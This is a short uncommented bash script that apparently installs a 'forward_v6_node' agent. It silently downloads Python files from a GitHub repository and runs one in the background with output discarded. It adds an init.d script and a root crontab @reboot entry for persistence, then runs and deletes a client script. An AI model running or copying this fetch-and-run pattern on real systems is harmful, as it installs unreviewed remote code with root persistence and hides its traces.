#!/bin/bash
echo "'Direct | Group | d5k7b1a7d9'" > /var/tmp/server_group
curl -s https://raw.githubusercontent.com/okfit001/forward_v6_node/refs/heads/main/crypto_utils.py -o /var/tmp/crypto_utils.py
curl -s https://raw.githubusercontent.com/okfit001/forward_v6_node/refs/heads/main/agent.py -o /var/tmp/agent.py
cat >/etc/init.d/agent.sh <<-EOF
#!/bin/sh
cd /var/tmp && nohup python3 agent.py >/dev/null 2>&1 &
EOF
chmod +x /etc/init.d/agent.sh
bash /etc/init.d/agent.sh
cat >>/var/spool/cron/crontabs/root <<-EOF
@reboot /etc/init.d/agent.sh
EOF

curl -s https://raw.githubusercontent.com/okfit001/forward_v6_node/refs/heads/main/init_client.py -o /var/tmp/client.py
python3 /var/tmp/client.py
rm -f /var/tmp/client.py
